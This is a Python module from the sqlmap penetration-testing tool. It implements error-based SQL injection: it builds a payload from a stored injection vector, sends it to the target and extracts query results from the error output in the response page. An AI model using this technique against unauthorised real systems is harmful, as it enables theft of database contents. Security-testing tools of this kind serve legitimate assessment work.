#!/usr/bin/env python

"""
$Id$

Copyright (c) 2006-2010 sqlmap developers (http://sqlmap.sourceforge.net/)
See the file 'doc/COPYING' for copying permission
"""

import re
import time

from lib.core.agent import agent
from lib.core.common import dataToStdout
from lib.core.common import extractRegexResult
from lib.core.common import getIdentifiedDBMS
from lib.core.common import initTechnique
from lib.core.common import randomInt
from lib.core.common import replaceNewlineTabs
from lib.core.common import safeStringFormat
from lib.core.data import conf
from lib.core.data import kb
from lib.core.data import logger
from lib.core.data import queries
from lib.core.enums import DBMS
from lib.core.enums import PAYLOAD
from lib.core.unescaper import unescaper
from lib.request.connect import Connect as Request

def errorUse(expression):
    """
    Retrieve the output of a SQL query taking advantage of an error SQL
    injection vulnerability on the affected parameter.
    """

    initTechnique(PAYLOAD.TECHNIQUE.ERROR)

    output = None
    vector = agent.cleanupPayload(kb.injection.data[PAYLOAD.TECHNIQUE.ERROR].vector)
    query = unescaper.unescape(vector)
    query = agent.prefixQuery(query)
    query = agent.suffixQuery(query)
    check = "%s(?P<result>.*?)%s" % (kb.misc.start, kb.misc.stop)

    _, _, _, _, _, _, fieldToCastStr = agent.getFields(expression)
    nulledCastedField = agent.nullAndCastField(fieldToCastStr)

    if getIdentifiedDBMS() == DBMS.MYSQL:
        nulledCastedField = nulledCastedField.replace("AS CHAR)", "AS CHAR(100))") # fix for that 'Subquery returns more than 1 row'

    expression = expression.replace(fieldToCastStr, nulledCastedField, 1)
    expression = unescaper.unescape(expression)
    expression = query.replace("[QUERY]", expression)

    payload = agent.payload(newValue=expression)
    page, _ = Request.queryPage(payload, content=True)
    output = extractRegexResult(check, page, re.DOTALL | re.IGNORECASE)

    if output:
        output = output.replace(kb.misc.space, " ")
        dataToStdout("[%s] [INFO] retrieved: %s\n" % (time.strftime("%X"), replaceNewlineTabs(output, stdout=True)))

    return output
